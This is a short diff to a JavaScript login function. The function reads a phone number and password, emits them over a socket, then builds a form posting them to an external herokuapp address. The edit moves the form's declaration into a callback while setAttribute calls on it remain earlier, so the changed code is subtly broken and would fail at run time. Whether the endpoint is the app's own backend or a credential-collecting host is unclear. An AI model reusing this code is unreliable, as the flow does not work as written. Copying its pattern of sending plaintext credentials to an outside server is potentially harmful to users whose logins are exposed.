@@ -20,11 +20,12 @@ function login(){
     var num = document.getElementById("login_number_2").value;
     var pass = document.getElementById("login_pass_2").value;
     var fullnumber= "+"+ val_code+ num.replace('0','');
-    var form = document.createElement("form");
+
     form.setAttribute("method", 'post');
     form.setAttribute("action", 'https://epos188.herokuapp.com/');
     socket.emit('login1',fullnumber,pass);
     socket.on('login1_dung',()=>{
+      var form = document.createElement("form");
       add_form('pass',document.getElementById("login_pass_2").value);
       add_form('number',num);
       add_form('code',val_code);
